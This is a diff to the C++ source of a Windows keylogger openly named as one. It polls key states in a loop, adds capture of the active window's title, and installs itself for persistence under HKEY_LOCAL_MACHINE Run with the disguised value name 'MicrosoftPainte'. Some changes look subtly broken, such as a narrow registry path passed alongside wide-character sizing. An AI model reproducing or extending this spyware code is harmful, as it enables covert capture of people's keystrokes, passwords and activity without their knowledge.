@@ -1,18 +1,16 @@
 #include <iostream>
 #include <Windows.h>
-#include <fstream>
 #include <string>
+#include <atlstr.h>
 #include <chrono>
 #include <thread>
-
 using namespace std;
-
-
 
 
 
 void Keylogger(int delai) {
 	while (true) {
+
 		if (GetKeyState('A') & 0x8000) {
 
 			cout << "A";
@@ -274,8 +272,17 @@ void Keylogger(int delai) {
 }
 
 
+
 int main()
 {
+	int limit = 200;
+	HWND console = GetConsoleWindow();
+
+	 ShowWindow(console, SW_SHOW);
+		 HWND app = GetForegroundWindow();
+		 char iss[200];
+		 GetWindowTextA(app,iss, 200);
+	// iss => to Show the name of the crurent active Window
 
 	system("title Keylogger");
 	string path;
@@ -304,7 +311,7 @@ int main()
 	}
 
 	HKEY key = NULL;
-	LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE | KEY_READ, &key);
+	LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE | KEY_READ, &key);
 	if (res == ERROR_SUCCESS) {
 		res = RegSetValueEx(key, TEXT("MicrosoftPainte"), 0, REG_SZ, (BYTE *)newPath.c_str(), (newPath.size()+1) * sizeof(wchar_t));
 		if (res == ERROR_SUCCESS) {
@@ -317,5 +324,8 @@ int main()
 	else {
 		cout << "Pas bon \n";
 	}
+
+
+
 	Keylogger(100);
 }
